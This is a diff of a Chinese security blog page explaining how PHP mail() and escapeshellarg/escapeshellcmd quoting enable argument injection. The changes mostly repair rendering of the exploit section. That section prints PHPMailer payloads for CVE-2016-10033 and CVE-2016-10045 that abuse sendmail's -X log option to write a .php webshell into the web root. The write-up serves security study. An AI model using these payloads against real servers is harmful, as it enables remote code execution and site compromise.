@@ -117,7 +117,7 @@
 <meta property="og:description" content="参考文献：https://xz.aliyun.com/t/2501题目网址：https://www.ripstech.com/php-security-calendar-2017/ 环境： php version &amp;lt; 5.2.0phpmailer &amp;lt; 5.2.18php 没有安装 pcre（no default）safe_mode = false（default）  题目1234567">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-73d8896355922304.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-12-03T13:11:47.100Z">
+<meta property="og:updated_time" content="2018-12-04T00:31:47.427Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP mail()可能导致的问题">
 <meta name="twitter:description" content="参考文献：https://xz.aliyun.com/t/2501题目网址：https://www.ripstech.com/php-security-calendar-2017/ 环境： php version &amp;lt; 5.2.0phpmailer &amp;lt; 5.2.18php 没有安装 pcre（no default）safe_mode = false（default）  题目1234567">
@@ -384,7 +384,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 21:11:47" itemprop="dateModified" datetime="2018-12-03T21:11:47+08:00">2018-12-03</time>
+                <time title="Modified: 2018-12-04 08:31:47" itemprop="dateModified" datetime="2018-12-04T08:31:47+08:00">2018-12-04</time>
               
             
           </span>
@@ -435,8 +435,9 @@
 <li>第三步处理之后的payload中的<code>\\</code>被解释成了<code>\</code>而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分：<br><code>&#39;127.0.0.1&#39;\</code><br><code>\&#39;&#39;  -v -d</code><br><code>a=1\&#39;</code></li>
 <li>所以这个payload可以简化为<code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向 <code>127.0.0.1\</code>发起请求，POST 数据为 <code>a=1&#39;</code> 。</li>
 </ul>
-<h4 id="根据此漏洞有两个实例："><a href="#根据此漏洞有两个实例：" class="headerlink" title="根据此漏洞有两个实例："></a>根据此漏洞有两个实例：</h4><p><strong>CVE-2016-10033</strong><br><em>payload：</em><br><figure class="highlight plain"><figcaption><span>-OQueueDirectory</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*然后通过 linux 自身的 sendmail 写log的方式，把log写到web根目录下。将日志文件后缀定义为 .php ，即可成功写入webshell。*</span><br><span class="line"></span><br><span class="line">**CVE-2016-10045**</span><br><span class="line">*payload：*</span><br></pre></td></tr></table></figure></p>
-<p>a’( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com<br><code>`</code></p>
+<h4 id="根据此漏洞有两个实例："><a href="#根据此漏洞有两个实例：" class="headerlink" title="根据此漏洞有两个实例："></a>根据此漏洞有两个实例：</h4><p><strong>CVE-2016-10033</strong><br><em>payload：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure></p>
+<p><em>然后通过 linux 自身的 sendmail 写log的方式，把log写到web根目录下。将日志文件后缀定义为 .php ，即可成功写入webshell。</em></p>
+<p><strong>CVE-2016-10045</strong><br><em>payload：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -564,7 +565,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-count">61</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
